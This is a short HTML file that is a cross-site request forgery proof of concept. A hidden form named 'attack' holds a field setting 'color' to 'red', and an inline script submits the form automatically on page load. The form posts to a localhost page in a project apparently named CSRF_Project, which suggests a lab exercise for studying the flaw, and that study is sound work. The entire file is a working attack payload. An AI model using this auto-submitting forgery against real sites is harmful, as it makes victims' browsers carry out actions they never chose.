<html>
<body>

<form id="attack" action="http://127.0.0.1/CSRF_Project/display.php" method="POST">
    <input type="hidden" name="color" value="red">
</form>

<script>
    document.getElementById('attack').submit();
</script>

</body>
</html>
